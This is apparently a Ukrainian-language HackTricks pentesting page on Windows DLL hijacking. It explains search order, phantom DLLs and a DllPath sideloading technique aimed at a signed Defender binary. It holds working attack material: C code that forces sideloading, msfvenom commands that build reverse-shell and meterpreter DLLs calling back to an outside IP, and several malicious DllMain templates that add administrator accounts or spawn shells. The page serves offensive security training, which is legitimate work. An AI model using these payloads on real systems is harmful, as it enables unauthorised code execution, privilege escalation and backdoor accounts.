# Dll Hijacking

{{#include ../../banners/hacktricks-training.md}}



## Базова інформація

DLL Hijacking передбачає маніпуляцію довіреним застосунком, щоб він завантажив шкідливу DLL. Цей термін охоплює декілька тактик, таких як **DLL Spoofing, Injection, and Side-Loading**. Він в основному використовується для виконання коду, досягнення persistence і, рідше, privilege escalation. Незважаючи на фокус на ескалації тут, методика hijacking залишається однаковою для різних цілей.

### Поширені техніки

Існує кілька методів DLL hijacking, кожен з яких ефективний залежно від стратегії завантаження DLL застосунку:

1. **DLL Replacement**: Заміна справжньої DLL на шкідливу, опціонально з використанням DLL Proxying для збереження функціональності оригінальної DLL.
2. **DLL Search Order Hijacking**: Розміщення шкідливої DLL у шляху пошуку раніше за легітимну, експлуатуючи шаблон пошуку застосунку.
3. **Phantom DLL Hijacking**: Створення шкідливої DLL для застосунку, який намагається завантажити неіснуючу обов'язкову DLL.
4. **DLL Redirection**: Зміна параметрів пошуку, таких як %PATH% або .exe.manifest / .exe.local файли, щоб спрямувати застосунок до шкідливої DLL.
5. **WinSxS DLL Replacement**: Підміна легітимної DLL на шкідливу у директорії WinSxS, метод часто пов’язаний із DLL side-loading.
6. **Relative Path DLL Hijacking**: Розміщення шкідливої DLL у керованій користувачем директорії разом зі скопійованим застосунком, що нагадує техніки Binary Proxy Execution.

## Пошук відсутніх Dlls

Найпоширеніший спосіб знайти відсутні Dlls у системі — запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) зі sysinternals, **встановивши** **наступні 2 фільтри**:

![](<../../images/image (311).png>)

![](<../../images/image (313).png>)

і просто показати **File System Activity**:

![](<../../images/image (314).png>)

Якщо ви шукаєте **відсутні dlls загалом**, ви **залишаєте** це запущеним на кілька **секунд**.\
Якщо ви шукаєте **відсутню dll всередині конкретного виконуваного файлу**, вам слід встановити **інший фільтр, наприклад "Process Name" "contains" "\<exec name>", виконати його та зупинити захоплення подій**.

## Exploiting Missing Dlls

Щоб ескалювати привілеї, найкращим шансом є можливість **записати DLL, яку процес з підвищеними правами спробує завантажити** у одне з **місць, де її будуть шукати**. Таким чином, ми зможемо **записати** DLL у **папку**, де **DLL шукають раніше**, ніж папку з **оригінальною DLL** (рідкісний випадок), або ми зможемо **записати у папку, де DLL буде шукатись**, і оригінальної **DLL не існує** в жодній з папок.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

**Windows applications** шукають DLL, слідуючи набору **передвизначених шляхів пошуку**, дотримуючись певної послідовності. Проблема DLL hijacking виникає, коли шкідлива DLL стратегічно розміщується в одному з цих каталогів так, щоб вона була завантажена раніше за автентичну DLL. Рішення для запобігання цьому — переконатись, що застосунок використовує абсолютні шляхи при посиланні на потрібні DLL.

Нижче ви можете побачити **DLL search order на 32-bit** системах:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Це **типовий** порядок пошуку з увімкненим **SafeDllSearchMode**. Коли він вимкнений, поточний каталог піднімається до другої позиції. Щоб відключити цю функцію, створіть значення реєстру **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** і встановіть його в 0 (за замовчуванням ввімкнено).

Якщо функцію [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) викликають з **LOAD_WITH_ALTERED_SEARCH_PATH**, пошук починається в директорії виконуваного модуля, який **LoadLibraryEx** завантажує.

Нарешті, зверніть увагу, що **DLL може бути завантажено із вказанням абсолютного шляху замість лише імені**. У такому випадку ця DLL **буде шукатись лише за цим шляхом** (якщо DLL має залежності, вони будуть шукатись як завантажені просто за іменем).

Існують інші способи змінити порядок пошуку, але я не буду тут їх пояснювати.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Просунутий спосіб детерміновано вплинути на DLL search path новоствореного процесу — встановити поле DllPath в RTL_USER_PROCESS_PARAMETERS при створенні процесу з нативними API ntdll. Поставивши тут директорію, контрольовану атакуючим, цільовий процес, який вирішує імпортовану DLL за іменем (без абсолютного шляху і без використання прапорів безпечного завантаження), може бути змушений завантажити шкідливу DLL з цієї директорії.

Ключова ідея
- Побудувати параметри процесу з RtlCreateProcessParametersEx і вказати власний DllPath, що вказує на вашу контрольовану папку (наприклад, директорію, де знаходиться ваш dropper/unpacker).
- Створити процес з RtlCreateUserProcess. Коли цільовий бінар розв'язує DLL за іменем, загрузчик звернеться до цього наданого DllPath під час розв'язання, що дозволяє надійно виконати sideloading навіть коли шкідлива DLL не знаходиться поруч із цільовим EXE.

Примітки/обмеження
- Це впливає на створюваний дочірній процес; відрізняється від SetDllDirectory, яка впливає лише на поточний процес.
- Ціль має імпортувати або викликати LoadLibrary для DLL за іменем (без абсолютного шляху і без використання LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs і захардкоджені абсолютні шляхи не можна захакати. Forwarded exports та SxS можуть змінювати пріоритет.

Мінімальний C-приклад (ntdll, wide strings, спрощена обробка помилок):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
Практичний приклад використання
- Помістіть зловмисний xmllite.dll (який експортує необхідні функції або виступає як проксі до справжнього) у ваш каталог DllPath.
- Запустіть підписаний бінарник, відомий тим, що шукає xmllite.dll за іменем, використовуючи описану вище техніку. Завантажувач резолвить імпорт через вказаний DllPath і підвантажує ваш DLL.

Цю техніку спостерігали в дикій природі як рушійну для багатоступеневих sideloading ланцюгів: початковий launcher скидає допоміжний DLL, який потім породжує підписаний Microsoft, hijackable бінарник з кастомним DllPath, щоб примусово завантажити DLL атакувальника з тимчасового каталогу.


#### Винятки щодо порядку пошуку dll з документації Windows

У документації Windows зазначені певні винятки зі стандартного порядку пошуку DLL:

- Коли зустрічається **DLL, яка має те саме ім'я, що й одна вже завантажена в пам'ять**, система обходить звичайний пошук. Замість цього вона проводить перевірку перенаправлення та маніфеста перед тим, як повернутися до DLL, яка вже знаходиться в пам'яті. **У цьому сценарії система не проводить пошуку DLL**.
- У випадках, коли DLL визнано **known DLL** для поточної версії Windows, система використовуватиме свою версію цієї known DLL разом з будь-якими її залежними DLL, **уникаючи процесу пошуку**. Ключ реєстру **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** містить список таких known DLL.
- Якщо **DLL має залежності**, пошук цих залежних DLL виконується так, ніби вони вказані лише своїми **іменами модулів**, незалежно від того, чи початкову DLL було ідентифіковано через повний шлях.

### Підвищення привілеїв

**Вимоги**:

- Виявити процес, який працює або буде працювати з **іншими привілеями** (горизонтальне або латеральне переміщення), який **не має DLL**.
- Переконатися, що є **права на запис** у будь-який **каталог**, у якому буде **шукатися DLL**. Це місце може бути каталогом виконуваного файлу або каталогом в системному шляху.

Так, ці вимоги важко знайти, оскільки **за замовчуванням досить дивно знайти привілейований виконуваний файл без DLL**, і ще **дивніше мати права запису в папці системного шляху** (звичайно, за замовчуванням це неможливо). Але в неправильно сконфігурованих середовищах це можливо.\
Якщо вам пощастить і ви відповідаєте вимогам, можете перевірити проект [UACME](https://github.com/hfiref0x/UACME). Навіть якщо **основна мета проєкту — обійти UAC**, ви можете знайти там **PoC** Dll hijaking для версії Windows, яку можна використати (ймовірно, просто змінивши шлях папки, де у вас є права на запис).

Зверніть увагу, що ви можете **перевірити свої права в папці**, зробивши:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
І **перевірте права доступу всіх папок у PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ви також можете перевірити імпорти виконуваного файлу та експорти dll за допомогою:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Автоматизовані інструменти

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) перевірить, чи маєте ви права на запис у будь-яку папку в системному PATH.\
Інші корисні автоматизовані інструменти для виявлення цієї вразливості — це функції **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ та _Write-HijackDll_.

### Приклад

Якщо ви знайдете експлуатований сценарій, однією з найважливіших речей для успішної експлуатації буде **створити dll, яка експортує принаймні всі функції, які виконуваний файл імпортуватиме з неї**. Зауважте, що Dll Hijacking корисний для [escalate from Medium Integrity level to High **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) або з [**High Integrity to SYSTEM**](#from-high-integrity-to-system). Ви можете знайти приклад **how to create a valid dll** у цьому дослідженні dll hijacking, орієнтованому на виконання через dll hijacking: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
Крім того, у **наступному розділі** ви знайдете кілька **базових dll-кодів**, які можуть бути корисні як **шаблони** або для створення **dll, що експортує необов'язкові функції**.

## **Створення та компіляція Dlls**

### **Dll Proxifying**

По суті, **Dll proxy** — це Dll, здатна **виконати ваш шкідливий код при завантаженні**, але також надавати і працювати як очікується, переадресовуючи всі виклики до справжньої бібліотеки.

За допомогою інструмента [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) або [**Spartacus**](https://github.com/Accenture/Spartacus) ви можете вказати виконуваний файл і вибрати бібліотеку, яку хочете proxify, і згенерувати proxified dll, або вказати Dll і згенерувати proxified dll.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Отримати meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Створити користувача (x86 — я не бачив версії x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Ваш власний

Зверніть увагу, що в кількох випадках Dll, який ви компілюєте, повинен **export several functions**, які будуть завантажені victim process; якщо ці функції не існують, **binary won't be able to load** їх і **exploit will fail**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Джерела

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)



- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../banners/hacktricks-training.md}}
